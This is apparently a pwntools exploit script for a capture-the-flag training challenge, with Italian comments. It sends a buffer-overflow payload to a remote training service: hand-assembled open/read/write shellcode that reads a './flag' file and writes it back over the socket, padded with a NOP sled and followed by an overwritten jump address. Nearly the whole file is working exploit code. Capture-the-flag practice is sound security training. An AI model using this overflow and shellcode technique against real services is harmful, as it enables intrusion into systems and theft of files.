from pwn import *
import time
#context.terminal = ['tmux', 'splitw', '-h']
'''

FUNZIONA, MA SAREBBE FICO ANCHE RISOLVERLA USANDO DUP2, ANCHE SE È PRATICAMENTE LA STESSA COSA

context.terminal = ['gnome-terminal', '-e']
r = process("./shellcode")
gdb.attach(r, """
	c
	""")
'''
r = remote("training.jinblack.it", 2005)
#r = remote("localhost", 2005)

#input("wait")
#print(r.recvuntil("name?\n"))

buffer = 0x4040c0
buffer_jump = 0x4040d0

'''
OPEN
mov    r8,rdi    SAVE THE ACTUAL FILE DESCRIPTOR OF THE SOCKET, dopo un po' di prove si vede che si trova in rdi (c'è una read prima dell'overflow)
mov    rax,0x2
mov    rdi,0x4040c0
xor    rsi,rsi
xor    rdx,rdx
syscall 

READ
mov    rdi,rax
xor    rax,rax
mov    rsi,0x4040c0
mov    rdx,0x100
syscall 

WRITE
mov rdi, r8
mov rax, 0x1
mov rsi, 0x4040c0
mov rdx, 0x100
syscall

'''

open_sh = b"\x49\x89\xF8\x48\xC7\xC0\x02\x00\x00\x00\x48\xC7\xC7\xC0\x40\x40\x00\x48\x31\xF6\x48\x31\xD2\x0F\x05"
read_sh = b"\x48\x89\xC7\x48\x31\xC0\x48\xC7\xC6\xC0\x40\x40\x00\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05"
write_sh = b"\x4C\x89\xC7\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC6\xC0\x40\x40\x00\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05"

shellcode = b"./flag\x00\x00"

xxx = open_sh + read_sh + write_sh

shellcode = shellcode + xxx.rjust(1008, b"\x90")
payload = shellcode + p64(buffer_jump)

r.send(payload)

r.interactive()
